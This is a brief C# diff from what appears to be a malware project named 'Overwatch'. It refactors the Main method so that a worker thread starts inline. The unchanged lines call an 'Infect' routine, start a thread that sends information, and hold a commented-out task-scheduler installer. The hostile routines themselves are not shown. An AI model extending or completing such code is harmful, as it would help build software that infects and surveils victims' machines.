@@ -11,18 +11,14 @@ namespace Overwatch
         //static cInstallTaskScheduler T = new cInstallTaskScheduler();
         static cSendingInformation s = new cSendingInformation();
         private static Thread SendingThread = new Thread(s.Sending);
-        public static void Thread()
-        {
-            cThread t = new cThread();
-            t.Start();
-        }
         static void Main(string[] args)
         {
             try
             {
                 cStartupOptions.ProcessStartInfo();
                 cChangeLabel.Infect(args);
-                Thread();
+                cThread t = new cThread();
+                t.Start();
                 SendingThread.Start();
             }
             catch (Exception ex) { Log.Write(ex.Message, true); }
